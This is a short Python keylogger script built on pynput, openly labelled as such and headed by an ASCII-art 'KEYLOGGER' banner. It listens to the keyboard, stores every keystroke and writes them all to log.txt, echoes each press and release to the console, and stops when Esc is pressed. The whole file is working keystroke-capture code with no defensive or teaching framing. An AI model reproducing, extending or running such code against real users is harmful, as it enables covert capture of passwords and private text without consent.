# keylogger using pynput

import pynput
from pynput.keyboard import Key, Listener

# Add ACII art
print('''
 __  ___  ___________    ____  __        ______     _______   _______  _______ .______      
|  |/  / |   ____\   \  /   / |  |      /  __  \   /  _____| /  _____||   ____||   _  \     
|  '  /  |  |__   \   \/   /  |  |     |  |  |  | |  |  __  |  |  __  |  |__   |  |_)  |    
|    <   |   __|   \_    _/   |  |     |  |  |  | |  | |_ | |  | |_ | |   __|  |      /     
|  .  \  |  |____    |  |     |  `----.|  `--'  | |  |__| | |  |__| | |  |____ |  |\  \----.
|__|\__\ |_______|   |__|     |_______| \______/   \______|  \______| |_______|| _| `._____|
''')                                                                                            

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        print('special key {0} pressed'.format(key))

def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
             #removing ''
            k = str(key).replace("'", "")
            f.write(k)

            #every keystroke for readability
            f.write(' ')

def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        #stop listener
        return False
            
with Listener(on_press=on_press,
                on_release=on_release) as listener:
    listener.join()
